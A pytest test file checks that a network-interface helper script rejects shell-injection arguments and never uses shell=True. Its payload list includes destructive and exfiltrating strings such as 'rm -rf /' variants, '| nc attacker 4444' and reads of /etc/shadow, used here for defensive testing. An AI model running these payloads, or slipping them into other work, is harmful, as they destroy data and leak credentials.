"""US-201 — argv-injection table for ``deploy/nova-ve-net.py``.

Confirms that classic shell-metacharacter payloads, command substitution
syntax, NUL bytes, and length-overflow inputs all reject with exit code
2 and produce zero side effects (no ``_run`` call).
"""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

import pytest


REPO_ROOT = Path(__file__).resolve().parents[2]
HELPER_PATH = REPO_ROOT / "deploy" / "nova-ve-net.py"


@pytest.fixture
def helper(monkeypatch, tmp_path):
    spec = importlib.util.spec_from_file_location("nova_ve_net_helper_inj", HELPER_PATH)
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    sys.modules["nova_ve_net_helper_inj"] = mod
    spec.loader.exec_module(mod)

    pids_path = tmp_path / "pids.json"
    proc_root = tmp_path / "proc"
    proc_root.mkdir()
    monkeypatch.setattr(mod, "PIDS_JSON_PATH", pids_path)
    monkeypatch.setattr(mod, "PROC_ROOT", proc_root)

    calls: list[list[str]] = []

    def fake_run(argv):
        calls.append(list(argv))
        return 0

    monkeypatch.setattr(mod, "_run", fake_run)
    mod._test_calls = calls  # type: ignore[attr-defined]
    return mod


# Classic payloads that would be lethal if the helper used a shell.
INJECTIONS: list[str] = [
    '"; rm -rf /',
    '$(rm -rf /)',
    '`rm -rf /`',
    '&& reboot',
    '|| reboot',
    '| nc attacker 4444',
    '> /etc/passwd',
    '< /etc/shadow',
    '; cat /etc/shadow',
    '\n/bin/sh',
    '\r\nrm -rf /',
    '\\$(rm -rf /)',
    '${IFS}rm${IFS}-rf${IFS}/',
    'novec0den1; rm -rf /',          # plausible-looking + payload
    'novec0den1 && reboot',
    'novec0den1\nnovec0den2',
    'novec0den1\x00novec0den2',      # NUL byte
    '../../etc/passwd',
    '/dev/full',
    'a' * 32,                        # IFNAMSIZ overflow
    'novec0den' + '1' * 10,          # too many digits
]


@pytest.mark.parametrize("payload", INJECTIONS)
def test_bridge_add_rejects_injection(helper, payload):
    rc = helper.main(["bridge-add", payload])
    assert rc == 2, f"payload accepted: {payload!r}"
    assert not helper._test_calls, f"side effect from {payload!r}"


@pytest.mark.parametrize("payload", INJECTIONS)
def test_bridge_del_rejects_injection(helper, payload):
    rc = helper.main(["bridge-del", payload])
    assert rc == 2, f"payload accepted: {payload!r}"
    assert not helper._test_calls


@pytest.mark.parametrize("payload", INJECTIONS)
def test_tap_add_rejects_injection(helper, payload):
    rc = helper.main(["tap-add", payload])
    assert rc == 2, f"payload accepted: {payload!r}"
    assert not helper._test_calls


@pytest.mark.parametrize("payload", INJECTIONS)
def test_veth_pair_rejects_injection_in_hostend(helper, payload):
    rc = helper.main(["veth-pair-add", payload, "nve0000d1i1p"])
    assert rc == 2
    assert not helper._test_calls


@pytest.mark.parametrize("payload", INJECTIONS)
def test_veth_pair_rejects_injection_in_peerend(helper, payload):
    rc = helper.main(["veth-pair-add", "nve0000d1i1h", payload])
    assert rc == 2
    assert not helper._test_calls


@pytest.mark.parametrize("payload", INJECTIONS)
def test_link_master_rejects_injection(helper, payload):
    rc = helper.main(["link-master", payload, "novec0den1"])
    assert rc == 2
    assert not helper._test_calls


@pytest.mark.parametrize("payload", INJECTIONS)
def test_addr_add_rejects_injection_in_cidr(helper, payload):
    rc = helper.main(["addr-add-in-netns", "4242", "eth0", payload])
    assert rc == 2
    assert not helper._test_calls


@pytest.mark.parametrize("payload", INJECTIONS)
def test_link_netns_rejects_injection_in_pid(helper, payload):
    rc = helper.main(["link-netns", "nve0000d1i1p", payload])
    assert rc == 2
    assert not helper._test_calls


@pytest.mark.parametrize("payload", INJECTIONS)
def test_link_set_name_rejects_injection_in_newname(helper, payload):
    rc = helper.main(["link-set-name-in-netns", "4242", "nve0000d1i1p", payload])
    assert rc == 2
    assert not helper._test_calls


def test_helper_uses_subprocess_without_shell(helper):
    """Static guard: deploy/nova-ve-net.py must never set ``shell=True``."""
    src = HELPER_PATH.read_text()
    # Forbid both raw and whitespace variants of shell=True.
    for forbidden in ("shell=True", "shell = True"):
        assert forbidden not in src, f"helper contains {forbidden!r}"
    # Sanity: the explicit ``shell=False`` argument is present.
    assert "shell=False" in src
